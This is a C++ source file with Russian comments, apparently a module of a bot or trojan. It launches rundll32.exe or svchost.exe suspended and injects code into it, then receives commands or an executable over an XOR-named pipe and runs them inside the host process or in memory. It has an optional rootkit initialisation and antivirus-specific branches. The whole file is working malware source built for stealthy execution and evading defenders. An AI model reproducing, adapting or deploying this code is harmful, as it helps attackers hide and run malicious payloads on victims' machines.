#include "sandbox.h"
#include "core\injects.h"
#include "core\crypt.h"
#include "core\pipe.h"
#include "core\runinmem.h"
#include "core\process.h"
#include "core\pe.h"
#include "main.h"

namespace Sandbox
{

static void CreateName( DWORD pid, StringBuilder& name )
{
	StringBuilderStack<24> s( _CS_("sandbox") );
	s += (uint)pid;
	Crypt::Name( s, Config::XorMask, name );
}

//специальный приемщик данных из родительского процесса
class SandboxServer : public PipeServer
{
		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
	
	public:

		//принятые данные
		void* data;
		int size;

		SandboxServer();
		~SandboxServer();
};

SandboxServer::SandboxServer()
{
	CreateName( Process::CurrentPID(), name );
}

SandboxServer::~SandboxServer()
{
}

//принимаем данные и завершаем работу сервера
int SandboxServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	data = Mem::Duplication( msgIn->data, msgIn->sz_data );
	size = msgIn->sz_data;
	return -1; //сигнал о закрытии сервера
}

///////////////////////////////////////////////////////////////////////////////////////////////

static DWORD JumpToRundll32( typeFuncThread func, const char* nameUser = 0 )
{
	HANDLE hprocess;
	HANDLE hthread;
	StringBuilder cmd(512);
	if( !Path::GetSystemDirectore(cmd) ) return false;
//	Path::AppendFile( cmd, _CS_("calc.exe") );//_CS_( "rundll32.exe" ) );
	Path::AppendFile( cmd, _CS_( "rundll32.exe" ) );
	DWORD options = CREATE_SUSPENDED;
	DWORD pid = Process::Exec( options, nameUser, &hprocess, &hthread, 0, 0, cmd );
	if( RunInjectCode2( hprocess, hthread, func, InjectCode ) )
		return pid;
	else
		API(KERNEL32, TerminateThread)( hthread, 0 );
	return 0;
}

DWORD JmpToSvchostSandBox( typeFuncThread func, const char* nameUser )
{
	if( Config::AV == AV_TrandMicro )
		return JmpToSvchost1( func, Config::exeDonor, nameUser );
	else
		return JmpToSvchost2( func, Config::exeDonor, nameUser );
}

bool Run( typeFuncThread func, const char* nameUser, const void* data, int c_data, bool exe )
{
	DWORD pid;
	if( exe )
	{
		if( !PE::IsValid(data) ) return false;
		PIMAGE_NT_HEADERS headerData = PE::GetNTHeaders( (HMODULE)data );
		//если нет таблицы релоков, то запускаем через rundll32.exe
		if( headerData->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0 )
			pid = JumpToRundll32( func, nameUser );
		else
			pid = JmpToSvchostSandBox( func, nameUser );
	}
	else
		pid = JmpToSvchostSandBox( func, nameUser );
	if( !pid ) return false;
	StringBuilderStack<64> name;
	CreateName( pid, name );
	PipeClient pipe(name);
	//в течении 5с пытаемся отправить данные
	bool ret = false;
	for( int i = 0; i < 50; i++ )
	{
		if( pipe.Send( 0, data, c_data ) ) 
		{
			ret = true;
			break;
		}
		Delay(100);
	}
	return ret;
}

void* Init( int* size )
{
	InitBot();
	Rand::Init();
	SandboxServer server;
	server.Start(); //принимаем данные
	if( size ) *size = server.size;
	return server.data;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////

static DWORD WINAPI ProcessExec( void* )
{
	char* data = (char*)Init();
	uint flags = *((uint*)data);
	char* cmd = data + sizeof(uint);
	DbgMsg( "Выполнение в Sandbox команды '%s'", cmd );
	if( !cmd ) return 0;
	if( flags & INIT_ROOTKIT ) InitRootkit();
	StringBuilderStack<MAX_PATH> currFolder(cmd);
	Path::GetPathName(currFolder);
	API(KERNEL32, SetCurrentDirectoryA)(currFolder);
	DWORD pid = Process::Exec(cmd);
	Mem::Free(data);
	return 0;
}

static bool ExecDirect( const char* cmd, int c_cmd, const char* nameUser, uint flags )
{
	Mem::Data data(c_cmd + 1 + sizeof(flags) );
	data.Append( &flags, sizeof(flags) );
	data.Append( cmd, c_cmd + 1 );
	return Run( ProcessExec, nameUser,  data.Ptr(), data.Len(), false );
}

bool Exec( StringBuilder& cmd, uint flags, const char* nameUser )
{
	return ExecDirect( cmd.c_str(), cmd.Len() + 1, nameUser, flags );
}

bool Exec( const char* cmd, uint flags, const char* nameUser )
{
	return ExecDirect( cmd, Str::Len(cmd) + 1, nameUser, flags );
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////

static DWORD WINAPI ProcessRunMem( void* )
{
	int size;
	char* data = (char*)Init(&size);
	RunInMem::RunExe( data, size );
	return 0;
}

bool RunMem( const void* data, int size, const char* nameUser )
{
	//если у ехе есть маска NAME_PIPE, то вместо нее указываем имя пайп канала менеджера
	int i = Mem::IndexOf( data, size, _CS_("NAME_PIPE"), 10 );
	if( i > 0 )
	{
		Mem::Copy( (byte*)data + i, Config::nameManager, sizeof(Config::nameManager) );
	}
	//если у ехе есть маска RAND_NAME_TEXT, то вместо нее генерируем случайное имя 
	i = Mem::IndexOf( data, size, _CS_("RAND_NAME_TEXT"), 14 );
	if( i > 0 )
	{
		Mem::Copy( (byte*)data + i, Config::TempNameFolder, Str::Len(Config::TempNameFolder) + 1 );
	}
	//прописываем папку бота
	i = Mem::IndexOf( data, size, _CS_("FOLDER_BOT"), 10 );
	if( i > 0 )
	{
		StringBuilderStack<MAX_PATH> folder;
		Config::GetBotFolder(folder);
		Mem::Copy( (byte*)data + i, folder, folder.Len() + 1 );
	}

	return Run( ProcessRunMem, nameUser, data, size, true );
}


/*

bool Run( typeFuncThread func, const void* data, int c_data )
{
	DWORD pid = JmpToSvchost(func);
	if( !pid ) return false;
	StringBuilderStack<64> name;
	CreateName( pid, name );
	bool ret = false;
	int size = c_data + sizeof(int);
	HANDLE file = API(KERNEL32, CreateFileMappingA)( INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, size, name );
	if( file )
	{
		int* ptr = (int*)API(KERNEL32, MapViewOfFile)( file, FILE_MAP_ALL_ACCESS, 0, 0, size );
		if( ptr )
		{
			ptr[0] = 0; //на всякий случай обнуляем
			Mem::Copy( ptr + 1, data, c_data );
			//указываем длину передаваемых данных, что автоматом является сигналом другому процессу для приема данных
			ptr[0] = c_data; 
			//ждем когда другой процесс заберет информацию, т.е. положит в ptr[0] = 0
			for( int i = 0; i < 50; i++ )
			{
				Delay(100);
				if( !ptr[0] ) break; //другой процесс принял данные
			}
			API(KERNEL32, UnmapViewOfFile)(ptr);
		}
		API(KERNEL32, CloseHandle)(file);
	}

}

void* Init( int* size )
{
	InitBot();
	if( size ) *size = 0;
	StringBuilderStack<64> name;
	CreateName( Process::CurrentPID(), name );
	HANDLE file = 0;
	//открываем файл с ожидаем,е сли процесс родитель не успел создать
	for( int i = 0; i < 50; i++ )
	{
		file = API(KERNEL32, CreateFileMappingA)( INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 0, name );
		if( file ) break;
		Delay(100);
	}
	if( !file ) return 0;
	void* ret = 0;
	int* ptr = (int*)API(KERNEL32, MapViewOfFile)( file, FILE_MAP_ALL_ACCESS, 0, 0, 0 );
	if( ptr )
	{
		//ждем пока процесс родитель положит данные
		for( int i = 0; i < 50; i++ )
		{
			if( ptr[0] ) break; //процесс родитель положил данные данные
			Delay(100);
		}
		int sz = ptr[0];
		if( sz > 0 )
		{
			ret = Mem::Duplication( ptr + 1, sz );
			if( size ) *size = sz;
		}
		API(KERNEL32, UnmapViewOfFile)(ptr);
	}
	API(KERNEL32, CloseHandle)(file);
	return ret;
}

static void CreateName( DWORD pid, StringBuilder& name )
{
	StringBuilderStack<24> s( _CS_("sandbox") );
	s += (uint)pid;
	Crypt::Name( s, Config::XorMask, name );
	name.Insert( 0, _CS_("Global\\") );
}
*/

}
